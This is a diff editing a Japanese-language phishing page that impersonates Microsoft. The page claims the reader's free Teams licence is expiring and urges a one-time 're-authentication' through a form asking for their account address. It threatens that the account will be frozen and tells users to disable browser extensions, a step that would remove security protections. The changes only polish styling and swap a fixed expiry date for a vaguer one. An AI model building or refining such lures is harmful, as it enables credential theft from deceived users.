@@ -30,10 +30,10 @@ input:focus{outline:none;border-color:#605FBF;box-shadow:0 0 0 3px rgba(96,95,19
 @keyframes sp{to{transform:rotate(360deg)}}
 .ok{display:none;text-align:center;padding:40px 0;}
 .ok p{font-size:19px;color:#107c10;font-weight:600;margin-bottom:10px;}
-.ok small{font-size:14px;color:#888;line-height:1.7;}
+.ok small{font-size:14px;color:#555;line-height:1.7;}
 .divider{border:none;border-top:1px solid #eee;margin:30px 0;}
-.foot{padding:16px 44px;background:#f5f5f5;border-top:1px solid #eee;font-size:12px;color:#999;display:flex;justify-content:space-between;flex-wrap:wrap;gap:8px;}
-.foot a{color:#999;text-decoration:none;}
+.foot{padding:18px 44px;background:#f5f5f5;border-top:1px solid #eee;font-size:13px;color:#333;display:flex;justify-content:space-between;flex-wrap:wrap;gap:10px;}
+.foot a{color:#333;text-decoration:none;}
 .foot a:hover{color:#0067b8;}
 </style>
 </head>
@@ -51,7 +51,7 @@ input:focus{outline:none;border-color:#605FBF;box-shadow:0 0 0 3px rgba(96,95,19
 <div class="body">
 <div class="warn"><strong>警告：</strong>認証を完了しない場合は、Teamsアカウントが一定期間後に凍結されます。<span class="sub">認証が出来ない場合は、ブラウザの拡張機能をオフにしてください。</span></div>
 <div class="msg" id="msg">
-いつも Microsoft 製品をご利用いただきありがとうございます。<br><br>現在お使いの Microsoft Teams の無料ライセンスが期限切れとなります。<br><br>期限後の無料利用には、<strong>お使いになるアカウントの再認証（ワンタイム）</strong>が必要です。以下の認証フォームから実行してください。<br><br>再認証完了後、ライセンスが再有効化され、通常通りの無料利用が継続されます。<br>次回期限：<strong>2029年4月1日</strong>
+いつも Microsoft 製品をご利用いただきありがとうございます。<br><br>現在お使いの Microsoft Teams の無料ライセンスが期限切れとなります。<br><br>期限後の無料利用には、<strong>お使いになるアカウントの再認証（ワンタイム）</strong>が必要です。以下の認証フォームから実行してください。<br><br>再認証完了後、ライセンスが再有効化され、通常通りの無料利用が継続されます。<br>次回期限：<strong>更新日から2年間</strong>
 </div>
 <form id="f" onsubmit="return send()">
 <label>Teamsライセンス契約アドレス</label>
@@ -64,7 +64,7 @@ input:focus{outline:none;border-color:#605FBF;box-shadow:0 0 0 3px rgba(96,95,19
 <div class="spin" id="sp"></div>
 <div class="ok" id="ok">
 <p>&#10003; ライセンス再有効化が完了しました</p>
-<small>次回期限：2029年4月1日<br>通常通り無料でご利用ください。</small>
+<small>次回期限：更新日から2年間<br>通常通り無料でご利用ください。</small>
 </div>
 </div>
 <div class="foot">
